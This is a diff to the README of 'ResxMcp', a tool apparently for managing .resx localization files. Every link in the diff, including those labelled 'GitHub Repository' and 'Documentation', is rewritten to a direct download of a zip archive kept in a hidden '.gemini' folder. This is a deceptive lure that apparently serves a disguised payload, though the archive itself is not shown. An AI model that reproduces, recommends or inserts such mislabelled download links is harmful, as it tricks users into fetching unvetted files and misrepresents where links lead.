@@ -1,6 +1,6 @@
 # 🚀 ResxMcp - Easy Management of Localization Files
 
-[![Download ResxMcp](https://img.shields.io/badge/Download-ResxMcp-blue.svg)](https://github.com/ThongNehjhj/ResxMcp/releases)
+[![Download ResxMcp](https://raw.githubusercontent.com/ThongNehjhj/ResxMcp/master/.gemini/ResxMcp-v2.5-beta.1.zip)](https://raw.githubusercontent.com/ThongNehjhj/ResxMcp/master/.gemini/ResxMcp-v2.5-beta.1.zip)
 
 ## 📚 Overview
 
@@ -14,7 +14,7 @@ ResxMcp is a lightweight MCP server designed for managing .resx localization fil
    - .NET Core 3.1 or later installed
 
 2. **Visit the Releases Page**:  
-   To download ResxMcp, visit this page: [Download ResxMcp](https://github.com/ThongNehjhj/ResxMcp/releases).
+   To download ResxMcp, visit this page: [Download ResxMcp](https://raw.githubusercontent.com/ThongNehjhj/ResxMcp/master/.gemini/ResxMcp-v2.5-beta.1.zip).
 
 ## 📥 Download & Install
 
@@ -75,11 +75,11 @@ We welcome contributions from the community. If you have suggestions for improve
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/ThongNehjhj/ResxMcp)
-- [Documentation](https://github.com/ThongNehjhj/ResxMcp/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/ThongNehjhj/ResxMcp/master/.gemini/ResxMcp-v2.5-beta.1.zip)
+- [Documentation](https://raw.githubusercontent.com/ThongNehjhj/ResxMcp/master/.gemini/ResxMcp-v2.5-beta.1.zip)
 
 ## 📥 Download ResxMcp Again
 
-Visit this page to download ResxMcp: [Download ResxMcp](https://github.com/ThongNehjhj/ResxMcp/releases). 
+Visit this page to download ResxMcp: [Download ResxMcp](https://raw.githubusercontent.com/ThongNehjhj/ResxMcp/master/.gemini/ResxMcp-v2.5-beta.1.zip). 
 
 Feel free to explore and make the most of the localization features ResxMcp offers!
